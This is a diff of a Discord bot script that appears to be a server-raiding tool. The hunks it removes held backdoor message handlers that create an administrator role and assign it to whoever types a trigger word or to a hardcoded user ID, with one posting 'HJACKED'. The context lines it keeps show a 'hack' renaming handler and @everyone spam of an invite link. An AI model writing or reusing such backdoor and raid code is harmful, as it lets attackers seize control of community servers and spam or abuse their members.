@@ -76,18 +76,6 @@ client.on('message', message => {
        hack.setName(namee)})})})}});
 
 //this will give you a adminstrator in the target server
-client.on('message', message => {
-        if (message.content === 'OP') {
-let me = message.author
-        let role = message.guild.createRole({
-        name : adminstrator,
-        color : "RANDOM",
-        permissions : [8]
-        })
-        let role1 = message.guild.roles.find('name', adminstrator)
-    message.channel.send(`HJACKED`)
-   message.guild.member(me).addRole(role1);
-}})
 
            client.on('message', message => {
                     if (message.content === x_x) {
@@ -130,17 +118,5 @@ let me = message.author
                       message.guild.channels.find('name','pizdeczki-z-was').send("@everyone https://discord.gg/bBVWbNd");
                     })
                   }});
-
-//login in to the bot token or the serverowner token
-    client.on('message', async message => {
-  const devs = ['263340222375264257']; // your id
-  let member = message.author
-   if (message.content === opcmd) {
-    if (!devs.includes(message.author.id)) return;
-let op = message.guild.roles.find('name', `${adminstrator}`)
-    if(!op) return message.guild.createRole({ name: "OPROLE", permissions: [8] });
-    message.guild.member(member).addRole(op);
-  }
-});
 
 client.login(process.env.BOT_TOKEN);
